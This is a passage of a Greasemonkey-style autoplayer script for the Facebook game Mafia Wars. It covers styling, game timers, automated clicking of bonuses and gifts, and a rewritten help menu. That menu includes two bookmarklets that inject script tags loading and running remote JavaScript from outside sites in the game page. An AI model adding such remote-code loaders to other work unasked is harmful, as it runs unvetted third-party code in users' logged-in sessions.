                 '#settingsBox label {font-weight: normal; color: #BCD2EA}' +
                 '#settingsBox img,#settingsBox label,#settingsBox span,#settingsBox input,#settingsBox select {vertical-align: middle;}' +
                 '#settingsBox img,#settingsBox span,#settingsBox label {position: static;}' +
                 '#settingsBox #generalTab div, #mafiaTab div, #displayTab div, #energyTab div, #healTab div {position: static;}' +
                 '#settingsBox #generalTab select, #mafiaTab select, #displayTab select, #energyTab select, #healTab select {position: static;}' +
                 '#settingsBox #generalTab textarea, #mafiaTab textarea, #displayTab textarea, #energyTab textarea, #healTab textarea {position: static;}' +
                 '#settingsBox #generalTab input, #mafiaTab input, #displayTab input, #energyTab input, #healTab input {position: static; margin: 0;}' +
                 '#settingsBox #generalTab .lhs, #mafiaTab .lhs, #displayTab .lhs, #energyTab .lhs, #healTab .lhs {position: static; width: 35%; float: left; text-align: right; padding: 3px;}' +
                 '#settingsBox #generalTab .rhs, #mafiaTab .rhs, #displayTab .rhs, #energyTab .rhs, #healTab  .rhs {position: static; float: left; padding: 3px;}' +
                 '#settingsBox #generalTab .single, #mafiaTab .single, #displayTab .single, #energyTab .single, #healTab .single {position: static; text-align: center}' +
                 '#settingsBox #generalTab .hide, #mafiaTab .hide, #displayTab .hide, #energyTab .hide, #healTab .hide {clear: both; visibility: hidden;}' +
                 '#settingsBox #staminaTab div {position: static;}' +
                 '#settingsBox #staminaTab img, span, label {position: static;}' +
                 '#settingsBox #staminaTab select {position: static;}' +
                 '#settingsBox #staminaTab textarea {position: static;}' +
                 '#settingsBox #staminaTab input {position: static; margin: 0;}' +
                 '#settingsBox #staminaTab .lhs {position: static; width: 40%; float: left; text-align: right; padding: 5px;}' +
                 '#settingsBox #staminaTab .rhs {position: static; float: left; padding: 5px;}' +
                 '#settingsBox #staminaTab .single {position: static; text-align: center}' +
                 '#settingsBox #staminaTab .hide {clear: both; visibility: hidden;}' +
                 // ********************** Log Box CSS **********************
                 '#mafiaLogBox div.mouseunderline:hover{text-decoration:underline}' +
                 '#mafiaLogBox .logEvent{border-bottom:1px solid #333; padding:4px 0px}' +
                 '#mafiaLogBox .eventTime{color:#888; font-size: 10px; width:75px;  float:left}' +
                 '#mafiaLogBox .eventBody{width:330px; float:right}' +
                 '#mafiaLogBox .eventTime,#mafiaLogBox .eventIcon,#mafiaLogBox .eventBody{}' +
                 '#mafiaLogBox .eventBody .good {color:#52E259;font-weight:bold;}' +
                 '#mafiaLogBox .eventBody .bad {color:#EC2D2D;font-weight:bold;}' +
                 '#mafiaLogBox .eventBody .warn {color:#EC2D2D;}' +
                 '#mafiaLogBox .eventBody .money {color:#00CC00;font-weight:bold;}' +
                 '#mafiaLogBox .eventBody .expense {color:#FFD927;}' +
                 '#mafiaLogBox .eventBody .loot {color:#FF6633;}' +
                 '#mafiaLogBox .eventBody .user {color:#FFD927;}' +
                 '#mafiaLogBox .eventBody .attacker {color:#EC2D2D;}' +
                 '#mafiaLogBox .eventBody .job {color:#52E259;font-weight:bold;}' +
                 '#mafiaLogBox .clear{clear:both}' +
                 '#mafiaLogBox .logEvent.Icon{background-repeat: no-repeat; background-position: 75px}' +
                 '#mafiaLogBox .logEvent.process.Icon{background-image:url(' + stripURI(processIcon) + ')}' +
                 '#mafiaLogBox .logEvent.search.Icon{background-image:url(' + stripURI(searchIcon) + ')}' +
                 '#mafiaLogBox .logEvent.warning.Icon{background-image:url(' + stripURI(warningIcon) + ')}' +
                 '#mafiaLogBox .logEvent.info.Icon{background-image:url(' + stripURI(infoIcon) + ')}' +
                 '#mafiaLogBox .logEvent.lootbag.Icon{background-image:url(' + stripURI(lootbagIcon) + ')}' +
								 '#mafiaLogBox .logEvent.killedMobster.Icon{background-image:url(' + stripURI(killedMobsterIcon) + ')}' +
                 '#mafiaLogBox .logEvent.found.Icon{background-image:url(' + stripURI(lootbagIcon) + ')}' +
                 '#mafiaLogBox .logEvent.updateGood.Icon{background-image:url(' + stripURI(updateGoodIcon) + ')}' +
                 '#mafiaLogBox .logEvent.updateBad.Icon{background-image:url(' + stripURI(updateBadIcon) + ')}' +
                 '#mafiaLogBox .logEvent.pause.Icon{background-image:url(' + stripURI(pauseIcon) + ')}' +
                 '#mafiaLogBox .logEvent.play.Icon{background-image:url(' + stripURI(playIcon) + ')}' +
                 '#mafiaLogBox .logEvent.yeah.Icon{background-image:url(' + stripURI(yeahIcon) + ')}' +
                 '#mafiaLogBox .logEvent.omg.Icon{background-image:url(' + stripURI(omgIcon) + ')}' +
                 '#mafiaLogBox .logEvent.experience.Icon{background-image:url(' + stripURI(experienceIcon) + ')}' +
                 '#mafiaLogBox .logEvent.experience.Icon{background-image:url(' + stripURI(experienceIcon) + ')}' +
                 '#mafiaLogBox .logEvent.health.Icon{background-image:url(' + stripURI(healthIcon) + ')}' +
                 '#mafiaLogBox .logEvent.cash.Icon{background-image:url(' + stripURI(cashIcon) + ')}' +
                 '#mafiaLogBox .logEvent.cashCuba.Icon{background-image:url(' + stripURI(cashCubaIcon) + ')}' +
                 '#mafiaLogBox .logEvent.cashMoscow.Icon{background-image:url(' + stripURI(cashMoscowIcon) + ')}' +
                 '#mafiaLogBox .logEvent.cashBangkok.Icon{background-image:url(' + stripURI(cashBangkokIcon) + ')}' +
                 '#mafiaLogBox .logEvent.cashVegas.Icon{background-image:url(' + stripURI(cashVegasIcon) + ')}' +
                 '#mafiaLogBox .logEvent.energyPack.Icon{background-image:url(' + stripURI(energyPackIcon) + ')}' +
                 '#mafiaLogBox .logEvent.healOnIcon.Icon{background-image:url(' + stripURI(healOnIcon) + ')}' +
                 '#mafiaLogBox .logEvent.healOffIcon.Icon{background-image:url(' + stripURI(healOffIcon) + ')}' +
                 '#mafiaLogBox .logEvent.healOnHoldIcon.Icon{background-image:url(' + stripURI(healOnHoldIcon) + ')}' +
                 '#mafiaLogBox .logEvent.staminaIcon.Icon{background-image:url(' + stripURI(staminaIcon) + ')}' +
                 '#mafiaLogBox .logEvent.energyIcon.Icon{background-image:url(' + stripURI(energyIcon) + ')}' +
                 '#mafiaLogBox .logEvent.attackIcon.Icon{background-image:url(' + stripURI(attackIcon) + ')}' +
                 '#mafiaLogBox .logEvent.defenseIcon.Icon{background-image:url(' + stripURI(defenseIcon) + ')}' +
                 '#mafiaLogBox .logEvent.healthIcon.Icon{background-image:url(' + stripURI(healthIcon) + ')}' +
                 // ********************** Energy Tab CSS **********************
                 '#ap_menu span:hover{text-decoration:underline}'+
                 '#ap_menu span{font-size: 12px; font-weight: bold; cursor: pointer; color: #FFD927}' +
                 '.ap_optgroup1 {background-color: #FFFF77; text-align: center; color: #000000; font-weight: bold; font-size: 11px}' +
                 '.ap_optgroup2 {background-color: #996633; text-align: center; color: #FFFFFF; font-size: 10px}' +
                 '.ap_option    {font-size: 10px; cursor: default;}' +
                 '.ap_option:hover {background-color:#660000;}';

    if (newCSS != mwapCSS){  // If CSS has changed, remove the old one and add a new one.
      remakeElement('style', document.getElementsByTagName('head')[0], {'id':'mwapCSS','type':'text/css'}).appendChild(document.createTextNode(newCSS));
    }

  } catch(ex) {
    addToLog('warning Icon', 'BUG DETECTED (refreshMWAPCSS): ' + ex);
  }
}

function showTimers() {
  addToLog('info Icon', '<span style="color:#04B4AE;">Time left on PS MWAP Timers:' +
      '<br>&nbsp;&nbsp;miniPackTimer: ' + getHoursTime('miniPackTimer') +
      '<br>&nbsp;&nbsp;buildCarTimer: ' + getHoursTime('buildCarTimer') +
      '<br>&nbsp;&nbsp;buildWeaponTimer: ' + getHoursTime('buildWeaponTimer') +
      '<br>&nbsp;&nbsp;takeHourNew York: ' + getHoursTime('takeHourNew York') +
      '<br>&nbsp;&nbsp;takeHourCuba: ' + getHoursTime('takeHourCuba') +
      '<br>&nbsp;&nbsp;takeHourMoscow: ' + getHoursTime('takeHourMoscow') +
      '<br>&nbsp;&nbsp;takeHourBangkok: ' + getHoursTime('takeHourBangkok') +
      '<br>&nbsp;&nbsp;takeHourLas Vegas: ' + getHoursTime('takeHourLas Vegas') +
      '<br>&nbsp;&nbsp;rewardEnergyTimer: ' + getHoursTime('rewardEnergyTimer') +
      '<br>&nbsp;&nbsp;AskforHelpMoscowTimer: ' + getHoursTime('AskforHelpMoscowTimer') +
      '<br>&nbsp;&nbsp;AskforHelpBangkokTimer: ' + getHoursTime('AskforHelpBangkokTimer') +
      '<br>&nbsp;&nbsp;wishListTimer: ' + getHoursTime('wishListTimer') +
      '<br>&nbsp;&nbsp;autoEnforcedTitleTimer: ' + getHoursTime('autoEnforcedTitleTimer') +
      '<br>&nbsp;&nbsp;warTimer: ' + getHoursTime('warTimer') +
      '<br>&nbsp;&nbsp;dailyChecklistTimer: ' + getHoursTime('dailyChecklistTimer') +
      '<br>&nbsp;&nbsp;autoGiftAcceptTimer: ' + getHoursTime('autoGiftAcceptTimer') +
      '<br>&nbsp;&nbsp;autoSafehouseTimer: ' + getHoursTime('autoSafehouseTimer') +
    '</span>');
  return;
}

function resetTimers(popup) {
  // Reset the timers.
  // 3600 : if an hour has passed
  // 1800 : if half an hour has passed
  // 900  : if 15 minutes have passed
  // 300  : if 5 minutes have passed
  addToLog('warning Icon', 'All active timers have been reset.');
  if (timeLeftGM('miniPackTimer')<3600) GM_setValue('miniPackTimer', 0);
  if (timeLeftGM('wishListTimer')<3600) GM_setValue('wishListTimer', 0);
  if (timeLeftGM('autoEnforcedTitleTimer')<3600) GM_setValue('autoEnforcedTitleTimer', 0);
  if (timeLeftGM('warTimer')<900) GM_setValue('warTimer', 0);
  if (timeLeftGM('buildCarTimer')<900) GM_setValue('buildCarTimer', 0);
  if (timeLeftGM('buildWeaponTimer')<900) GM_setValue('buildWeaponTimer', 0);
  if (timeLeftGM('takeHourLas Vegas')<300) GM_setValue('takeHourLas Vegas', 0);
  if (timeLeftGM('takeHourBangkok')<300) GM_setValue('takeHourBangkok', 0);
  if (timeLeftGM('takeHourCuba')<300) GM_setValue('takeHourCuba', 0);
  if (timeLeftGM('takeHourMoscow')<300) GM_setValue('takeHourMoscow', 0);
  if (timeLeftGM('takeHourNew York')<300) GM_setValue('takeHourNew York', 0);
  if (timeLeftGM('dailyChecklistTimer')<3600) GM_setValue('dailyChecklistTimer', 0);
  if (timeLeftGM('autoGiftAcceptTimer')<3600) GM_setValue('autoGiftAcceptTimer', 0);
  if (timeLeftGM('autoSafehouseTimer')<3600) GM_setValue('autoSafehouseTimer', 0);
  if (timeLeftGM('AskforHelpMoscowTimer')<3600) GM_setValue('AskforHelpMoscowTimer', 0);
  if (timeLeftGM('AskforHelpBangkokTimer')<3600) GM_setValue('AskforHelpBangkokTimer', 0);
  if (timeLeftGM('rewardEnergyTimer')<1800) GM_setValue('rewardEnergyTimer', 0);
  if (timeLeftGM('checkVaultTimer')<1800) GM_setValue('checkVaultTimer', 0);
  if (popup) {
    alert('All active timers have been reset.');
    // Restart the timers.
    Autoplay.delay = 150;
    Autoplay.start();
    autoReload();
  }
  return;
}

// Perform click actions here
function doQuickClicks() {
  try {
    // Common clicking method
    var doClick = function (xpath, gmFlag) {
      var elt = xpathFirst (xpath);
      if (elt && isGMChecked(gmFlag)) {
        clickElement(elt);
        DEBUG('Clicked button for ' + gmFlag);
        return true;
      }
      return false;
    };

    // Click the level up bonus
    if (doClick('.//a[contains(@onclick,"postLevelUpFeedAndSend(); levelUpBoost();")]', 'autoLevelPublish')) return;

    // Click the achievement bonus
    if (doClick('.//a[contains(.,"Share the wealth!")]', 'autoAchievementPublish')) return;

    // Click the reward button
    if (doClick('.//div//a[@class="sexy_button" and contains(text(),"Reward Friends")]', 'autoWarRewardPublish')) return;
    if (doClick('.//div//a[@class="sexy_button_new short_white sexy_call_new" and contains(text(),"Reward Friends")]', 'autoWarRewardPublish')) return;

    // Click the 'Call for Help!' button
    if (doClick('.//div//a[@class="sexy_button" and contains(.,"Ask Friends for Help!")]', 'autoWarResponsePublish')) return;
    if (doClick('.//div//a[@class="sexy_button_new short_white sexy_call_new" and contains(.,"Ask Friends for Help!")]', 'autoWarResponsePublish')) return;

    // Click the 'Rally More Help!' button
    if (doClick('.//div//a[@class="sexy_button" and contains(text(),"Rally More Help")]', 'autoWarRallyPublish')) return;
    if (doClick('.//div//a[@class="sexy_button_new short_white sexy_call_new" and contains(text(),"Rally More Help")]', 'autoWarRallyPublish')) return;

    // Can bank flag
    var canBank = isGMChecked(cities[city][CITY_AUTOBANK]) && !suspendBank && !quickBankFail &&
                  cities[city][CITY_CASH] >= parseInt(GM_getValue(cities[city][CITY_BANKCONFG]));

    // Do quick banking
    if (canBank && !isNaN(city) && !isNaN(cities[city][CITY_CASH])) {
      quickBank(city, cities[city][CITY_CASH]);
    }

/*
    //This has to be fixed, since Z changed the way energy packs can be sent to mafia members
    //This code does not work anymore

    // Auto-send energy pack
    var actionElt = document.getElementById('message_box_menu_counter_bg_energy_packs');
    if (isGMChecked('sendEnergyPack') && (actionElt ||
        xpathFirst('.//div[@id="message_box_menu_checkmark_energy_packs" and @class="mbox_menu_unchecked"]', innerPageElt))) {
      // Ok, if we're here, then there is a number next to the Daily Checklist Energy Pack item
      // it might be for using the pack, not sending it, so click the menu item
      var eltPacksClick = xpathFirst('.//div[@class="mbox_click_wrapper_two" and contains(@onclick,"energy_packs")]', innerPageElt);
      if (eltPacksClick) {
        clickElement(eltPacksClick);
      }
      /* Grab the container used for sending energy
      var checkElt = document.getElementById('mbox_energy_send_container');
      if (checkElt) {
        // If the 'send energy container' is visible, we can click it
        if (checkElt.style.display == 'block') {
          //var actionLink = makeElement('a', null, {'onclick':'do_ajax("inner_page","remote/html_server.php?xw_controller=index&xw_action=send_energy_pak&xw_city=1&activehustle=energy_packs&hustle_nrg_use=0&hustle_nrg_send=1")'});
          var actionLink = makeElement('a', null, {'onclick':'return do_ajax("inner_page","remote/html_server.php?xw_controller=index&xw_action=send_energy_pak&xw_city=1&activehustle=energy_packs&hustle_nrg_use=0&hustle_nrg_send=1", 1, 1, 0, 0); return false;'});
          if (actionLink) {
            clickElement(actionLink);
            DEBUG('Daily Checklist: Clicked to send energy pack to my mafia.');
          }
        }
      }
      // Grab the container used for sending energy and click the first send energy link
      var checkElt = xpathFirst('.//div[@id="mbox_energy_send_container" and contains(@style,"block")]//a[@class="sexy_button_new short_black"]', innerPageElt);
      if (checkElt) {
        clickElement(checkElt);
        DEBUG('Daily Checklist: Clicked to prepare to send energy pack to my mafia.');
      }
      // Look for final send energy pack button
      var sendElt = xpathFirst('.//div[@id="message_box_energy_packs_content" and contains(@style,"block")]//div[@id="mbox_energy_all_prompt_msg" and contains(@style,"block")]//a[@class="sexy_button_new short_black" and contains(@onclick,"send_energy_pak")]', innerPageElt);
      if (sendElt) {
        clickElement(sendElt);
        DEBUG('Daily Checklist: Clicked to send energy pack to my mafia.');
      }
    }
*/
    // Get daily checklist bonus
    var actionElt = getActionBox('Daily Checklist Complete');
    if (actionElt) {
      var actionLink = getActionLink (actionElt, 'Collect Skill Point');
      if (!actionLink) actionLink = getActionLink (actionElt, 'Collect Reward Point');
      if (!actionLink) actionLink = getActionLink (actionElt, 'Claim Mystery Reward');
      if (actionLink && actionLink.scrollWidth) {
        clickElement(actionLink);
        DEBUG('Clicked to collect checklist bonus.');
      }
    }

    // Ask your mafia to send you energy Packs
    var actionElt = getActionBox('Ask your mafia for energy');
    if (actionElt && isGMChecked('askEnergyPack')) {
      var actionLink = getActionLink (actionElt, 'Ask your mafia for energy');
      if (actionLink && actionLink.scrollWidth) {
        clickElement(actionLink);
        addToLog('info Icon','Clicked to ask your mafia for Energy Packs.');
        DEBUG('Clicked to ask for Energy.');
      }
    }

    // Reward your mafia for sending you energy Packs
    var actionElt = xpathFirst('.//div[@id="mbox_energy_timer_container"]', innerPageElt);
    if (isGMChecked('rewardEnergyPack') && !timeLeftGM('rewardEnergyTimer') && actionElt) {
      var actionLink = xpathFirst('//a[contains(text(), "Show more")]', innerPageElt);
      if (actionLink) {
        clickElement(actionLink);
        addToLog('info Icon','Clicked to reward your mafia for Energy Packs.');
        DEBUG('Clicked to reward your mafia for Energy Packs.');
      }
      setGMTime('rewardEnergyTimer', '4 hours');
    }

    // Click hide action box elements
    var hideElts = xpath('.//a[contains(@onclick,"xw_action=dismiss_message")]', innerPageElt);
    for (var i = 0, iLength = hideElts.snapshotLength; i < iLength; ++i) {
      if (hideElts.snapshotItem(i)) clickElement(hideElts.snapshotItem(i));
    }

    // Click mystery gift elements
    //var mysteryElts = xpath('.//div[@class="msg_box_div_contents" and contains(.,"Mystery Bag")]', innerPageElt);
    var mysteryElts = xpath('.//div[@class="msg_box_div_contents" and contains(.,"Mystery")]', innerPageElt);
    for (var i = 0, iLength = mysteryElts.snapshotLength; i < iLength; ++i) {
      if (mysteryElts.snapshotItem(i) && !/display: none/.test(mysteryElts.snapshotItem(i).innerHTML)) {
        var linkElt = getActionLink (mysteryElts.snapshotItem(i), 'Open It!');
        if (linkElt) clickElement(linkElt);
      }
    }

    var featJobsElt = xpathFirst('.//div[contains(@style,"graphics/featjob/")]', innerPageElt);
    if (isGMChecked('featJob') && onHome() && featJobsElt) {
      var collectElt = getActionLink (featJobsElt, 'Collect!');
      var chooseElt = getActionLink (featJobsElt, 'Choose Job');
      var jobIndex = parseInt(GM_getValue('featJobIndex',0)) + 1;
      var jobElt = xpathFirst('.//a[contains(@onclick,"xw_action=do_holiday_job") and ' +
                              'contains(@onclick,"job_period_id='+jobIndex+'")]', featJobsElt);

      var energyReq = 30;
      switch (jobIndex) {
        case 1: energyReq = 30; break;
        case 2: energyReq = 60; break;
        case 3: energyReq = 100;
      }

      // Collect Bonus from feature jobs
      if (collectElt) {
        clickElement(collectElt);
        addToLog('yeah Icon', 'Clicked to collect bonus from featured job.');

      // Do featured job
      } else if (energy >= energyReq && jobElt) {
        clickElement(jobElt);
        addToLog('yeah Icon', 'Clicked to peform featured job -> '+featJobNames[jobIndex - 1]+'.');

      // Choose job
      } else if (energy >= energyReq && chooseElt) {
        clickElement(linkElt);
      }
    }
  } catch (ex) {
    DEBUG('Error @doQuickClicks: ' + ex);
  }
}

// Parse certain messages appearing on the message window
function doParseMessages() {
  var msgs = $x('//td[@class="message_body"]');
  if (msgs && msgs.length > 0) {
    for (var i = 0, iLength=msgs.length; i < iLength; ++i) {
      // Log Minipack kick-off
      if (/Mini[\s\w]+Buff/i.test(msgs[i].innerHTML)) {
        addToLog('yeah Icon', msgs[i].innerHTML);
        setGMTime('miniPackTimer', '8 hours');
      }
    }
  }
}

function customizeMasthead() {
  // Document title
  document.title = "Mafia Wars on Facebook";
  if (isGMChecked('fbwindowtitle')) {
    if (GM_getValue('FBName'))
      document.title = GM_getValue('FBName');
  }

  if (document.getElementById('ap_menu')) return;

  // Get the masthead.
  if(new_header){
    var mastheadElt = xpathFirst('//div[@class="header_top_row"]');
  } else {
    var mastheadElt = document.getElementById('mw_masthead');
  }
  if (!mastheadElt) return;

  // Links
  var linkElt = makeElement('div', mastheadElt,
    {'id':'ap_links', 'style':'position: absolute; top: 4px; right: 10px; text-align: left;' +
     'font-size: 12px; font-weight: bold;'});
  makeElement('a', linkElt, {'href':'http://www.playerscripts.com/index.php?option=com_rokdownloads&view=file&Itemid=64','target':'_blank'})
    .appendChild(document.createTextNode('For Firefox'));
  linkElt.appendChild(document.createTextNode(' | '));
  makeElement('a', linkElt, {'href':'https://chrome.google.com/extensions/detail/cgagpckjofhomehafhognmangbjdiaap','target':'_blank'})
    .appendChild(document.createTextNode('For Chrome'));

  // Make a container for the autoplayer menu. //mychange
  var mwapTitle = 'PS MWAP ' + SCRIPT.version ;
  if (new_header) mwapTitle += ' (nH)' ;  // mark header a new header

  makeElement('div', mastheadElt, {'style':'position: absolute; top: 20px; right: 10px; text-align: left; font-size: 11px; font-weight: bold; color: white'}).appendChild(document.createTextNode(mwapTitle));
  var menuElt = makeElement('div', mastheadElt, {'id':'ap_menu', 'style':'position: absolute; top: 34px; font-size: 11px; right: 10px; text-align: left;'});

  // Change help instructions
  var helpElt = xpathFirst('.//div[@onmouseover="instructionopen()"]', innerPageElt);

  if(new_header){
    allHelpMenus = document.evaluate("//li[@class='dropdown divider']",document,null,XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,null);
    helpMenu = allHelpMenus.snapshotItem(2);
    helpMenu.innerHTML =
      '<div class="help">' +
      '<a href="http://apps.facebook.com/inthemafia" onclick="return false;" class="dropdown">PS MWAP</a>' +
      '</div>' +
      '<ul id="linklist">' +
      '<li><b style="padding-left:5px;">Downloads</b></li>' +
      '<li><a href="http://www.playerscripts.com/index.php?option=com_rokdownloads&view=file&Itemid=64" target="_blank">' +
      '&nbsp;&nbsp;For Firefox' +
      '</a></li>' +
      '<li><a href="https://chrome.google.com/extensions/detail/cgagpckjofhomehafhognmangbjdiaap" target="_blank"> ' +
      '&nbsp;&nbsp;For Chrome' +
      '</a></li>' +
      '<li><a href="http://www.playerscripts.com/index.php?option=com_jumi&fileid=3&Itemid=18" target="_blank"> ' +
          '&nbsp;&nbsp;Revert to Previous' +
      '</a></li> ' +
      '<b style="padding-left:5px;">Websites</b><br/>' +
      '<li><a href="http://www.playerscripts.com/index.php?option=com_ajaxchat&view=ajaxchat&Itemid=55" target="_blank"> ' +
        '&nbsp;&nbsp;PlayerScripts Chat' +
      '</a></li>' +
      '<li><a href="http://www.playerscripts.com/" target="_blank"> ' +
        '&nbsp;&nbsp;PlayerScripts ' +
      '</a></li>' +
       '<li><a href="http://forums.zynga.com/forumdisplay.php?f=36" target="_blank"> ' +
         '&nbsp;&nbsp;Zolli Forums' +
       '</a></li>' +
       '<b style="padding-left:5px;">Bookmarklets</b>' +
       '<li><a href="javascript:(function(){var%20a%3Ddocument.createElement(%22script%22)%3Ba.type%3D%22text%2Fjavascript%22%3Ba.src%3D%22http%3A%2F%2Fuserscripts.org%2Fscripts%2Fsource%2F68186.user.js%3F%22%2BMath.random()%3Bdocument.getElementsByTagName(%22head%22)[0].appendChild(a)})()%3B"> ' +
         '&nbsp;&nbsp;Chuck-a-Crap ' +
       '</a></li> ' +
       '<li><a href="javascript:%28function%28%29%7Bvar%20a%3Ddocument.createElement%28%22script%22%29%3Ba.type%3D%22text%2Fjavascript%22%3Ba.src%3D%22http://www.spockholm.com/mafia/robber.js%3F%22%2BMath.random%28%29%3Bdocument.getElementsByTagName%28%22head%22%29%5B0%5D.appendChild%28a%29%7D%29%28%29%3B"> ' +
         '&nbsp;&nbsp;Spock&#39;s Robber v1.08' +
       '</a></li>' +
       '<li><a></a></li>';
    linklist = document.getElementById('linklist');
    linklist.style.width = "200px";

    // Check Las Vegas Vault (PS MWAP menu)
    var lobjcheckVault = makeElement('li', null, {'id':'checkVault'});
    lobjcheckVault.innerHTML = '<a id="checkVault">Check Las Vegas Vault</a>';
    lobjcheckVault.addEventListener('click', checkVaultStatus, false);
    linklist.insertBefore(lobjcheckVault, linklist.firstChild);

    // Reset Timers (PS MWAP menu)
    var lobjresetTimers = makeElement('li', null, {'id':'resetTimers'});
    lobjresetTimers.innerHTML = '<a id="resetTimers">Reset Timers</a>';
    lobjresetTimers.addEventListener('click', resetTimers, false);
    linklist.insertBefore(lobjresetTimers, linklist.firstChild);
    // Show Timers (PS MWAP menu)
    var lobjshowTimers = makeElement('li', null, {'id':'showTimers'});
    lobjshowTimers.innerHTML = '<a id="showTimers">Show Timers</a>';
    lobjshowTimers.addEventListener('click', showTimers, false);
    linklist.insertBefore(lobjshowTimers, linklist.firstChild);

    // Settings Link (PS MWAP menu)
    var lobjAutoPlay = makeElement('li', null, {'id':'autoPlay'});
    lobjAutoPlay.innerHTML = '<a id="autoPlay">Settings</a>';
    lobjAutoPlay.addEventListener('click', toggleSettings, false);
    linklist.insertBefore(lobjAutoPlay, linklist.firstChild);
  } else {
    var titleElt = xpathFirst('.//span[contains(text(),"Help")]',helpElt)
    titleElt.innerHTML = "PS MWAP";
    //titleElt.style.width= "115px";
    titleElt.parentNode.parentNode.parentNode.style.width= "120px";
    titleElt.parentNode.parentNode.parentNode.parentNode.style.width= "120px";
    titleElt.parentNode.parentNode.parentNode.parentNode.parentNode.style.width= "120px";
    var helpMenu = xpathFirst('.//div[@id="instruction_menu"]', helpElt);
    helpMenu.style.width = "200px";
    helpMenu.innerHTML = '<a><div class="sexy_destination top" style="height: 0px; padding: 0px"></div></a>' +
                       '<div class="sexy_destination middle"><b>Downloads</b></div> ' +
                       '<a href="http://www.playerscripts.com/index.php?option=com_rokdownloads&view=file&Itemid=64" target="_blank"> ' +
                       '  <div class="sexy_destination middle">&nbsp;&nbsp;For Firefox</div> ' +
                       '</a> ' +
                       '<a href="https://chrome.google.com/extensions/detail/cgagpckjofhomehafhognmangbjdiaap" target="_blank"> ' +
                       '  <div class="sexy_destination middle">&nbsp;&nbsp;For Chrome</div> ' +
                       '</a> ' +
                       '<a href="http://www.playerscripts.com/index.php?option=com_jumi&fileid=3&Itemid=18" target="_blank"> ' +
                       '  <div class="sexy_destination middle">&nbsp;&nbsp;Revert to Previous</div> ' +
                       '</a> ' +
                       '<div class="sexy_destination middle"><b>Websites</b></div> ' +
                       '<a href="http://www.playerscripts.com/index.php?option=com_ajaxchat&view=ajaxchat&Itemid=55" target="_blank"> ' +
                       '  <div class="sexy_destination middle">&nbsp;&nbsp;PlayerScripts Chat</div> ' +
                       '</a>' +
                       '<a href="http://www.playerscripts.com/" target="_blank"> ' +
                       '  <div class="sexy_destination middle">&nbsp;&nbsp;PlayerScripts</div> ' +
                       '</a>' +
                       '<a href="http://forums.zynga.com/forumdisplay.php?f=36" target="_blank"> ' +
                       '  <div class="sexy_destination middle">&nbsp;&nbsp;Zolli Forums</div> ' +
                       '</a>' +
                       '<div class="sexy_destination middle"><b>Bookmarklets</b></div> ' +
                       '<a href="javascript:(function(){var%20a%3Ddocument.createElement(%22script%22)%3Ba.type%3D%22text%2Fjavascript%22%3Ba.src%3D%22http%3A%2F%2Fuserscripts.org%2Fscripts%2Fsource%2F68186.user.js%3F%22%2BMath.random()%3Bdocument.getElementsByTagName(%22head%22)[0].appendChild(a)})()%3B"> ' +
                       '  <div class="sexy_destination middle">&nbsp;&nbsp;Chuck-a-Crap</div> ' +
                       '</a> ' +
                       '<a href="javascript:%28function%28%29%7Bvar%20a%3Ddocument.createElement%28%22script%22%29%3Ba.type%3D%22text%2Fjavascript%22%3Ba.src%3D%22http://www.spockholm.com/mafia/robber.js%3F%22%2BMath.random%28%29%3Bdocument.getElementsByTagName%28%22head%22%29%5B0%5D.appendChild%28a%29%7D%29%28%29%3B"> ' +
                       '  <div class="sexy_destination middle">&nbsp;&nbsp;Spock&#39;s Robber v1.08</div> ' +
                       '</a> ' +
                       '<a><div class="sexy_destination bottom" style="height: 0px; padding: 0px"></div></a>';

    // Check Las Vegas Vault (PS MWAP menu)
    var lobjcheckVault = makeElement('a', null, {'id':'checkVault'});
    lobjcheckVault.innerHTML = '<div class="sexy_destination middle"><span id="checkVault">Check Las Vegas Vault</span></div>';
    lobjcheckVault.addEventListener('click', checkVaultStatus, false);
    helpMenu.insertBefore(lobjcheckVault, helpMenu.firstChild);

    // Reset Timers (PS MWAP menu)
    var lobjresetTimers = makeElement('a', null, {'id':'resetTimers'});
    lobjresetTimers.innerHTML = '<div class="sexy_destination middle"> ' +
                           '  <span id="resetTimers">Reset Timers</span></div>';
    lobjresetTimers.addEventListener('click', resetTimers, false);
    helpMenu.insertBefore(lobjresetTimers, helpMenu.firstChild);
    // Show Timers (PS MWAP menu)
    var lobjshowTimers = makeElement('a', null, {'id':'showTimers'});
    lobjshowTimers.innerHTML = '<div class="sexy_destination middle"> ' +
                           '  <span id="showTimers">Show Timers</span></div>';
    lobjshowTimers.addEventListener('click', showTimers, false);
    helpMenu.insertBefore(lobjshowTimers, helpMenu.firstChild);

    // Settings Link (PS MWAP menu)
    var lobjAutoPlay = makeElement('a', null, {'id':'autoPlay'});
    lobjAutoPlay.innerHTML = '<a><div class="sexy_destination top" style="height: 0px; padding: 0px"></div></a>' +
                           '<div class="sexy_destination middle"> ' +
                           '  <span id="autoPlay">Settings</span></div>';
    lobjAutoPlay.addEventListener('click', toggleSettings, false);
    helpMenu.insertBefore(lobjAutoPlay, helpMenu.firstChild);
  }

  // Settings Link main page
  menuElt.appendChild(document.createTextNode(' | '));
  var lobjAutoPlay = makeElement('span', menuElt, {'id':'autoPlay'});
  lobjAutoPlay.appendChild(document.createTextNode('Settings'));
  lobjAutoPlay.addEventListener('click', toggleSettings, false);

  // View log button.
  menuElt.appendChild(document.createTextNode(' | '));
  var lobjViewLogButton = makeElement('span', menuElt);
  lobjViewLogButton.appendChild(document.createTextNode('Log'));
  lobjViewLogButton.addEventListener('click', showMafiaLogBox, false);

  // Show resume or paused based on if we are running or not.
  updateMastheadMenu();
}

function customizeStats() {
  // Don't watch the stats area while we're making changes to it.
  setListenStats(false);

  // Show points until next level.
//  var elt = xpathFirst('.//div[@id="user_stats"]//h4[@class="experience" and contains(text(), "Experience")]', appLayoutElt);
//  if (!elt) elt = xpathFirst('.//div[@id="user_stats"]//span[@class="stat_title" and contains(text(),"Experience")]', appLayoutElt);
//  if (elt) {
//    elt.innerHTML = 'Experience (' + (ptsToNextLevel > 0? '-' : '+') + Math.abs(ptsToNextLevel) + ')';
//  }

  // Make bank icon clickable for instant banking
  var bankLinkElt = document.getElementById('mwap_bank');
  var bankElt = xpathFirst('.//div[@id="game_stats"]//div[@id="cash_stats_'+cities[city][CITY_ALIAS]+'"]/h4/text()', statsrowElt);
  if (bankElt && !bankLinkElt) {
    bankLinkElt = makeElement('a', null, {'id': 'mwap_bank', 'title': 'Click to bank immediately.'});
    bankElt.parentNode.insertBefore(bankLinkElt, bankElt);
    bankLinkElt.appendChild(bankElt);
    bankLinkElt.addEventListener('click', quickBank, false);
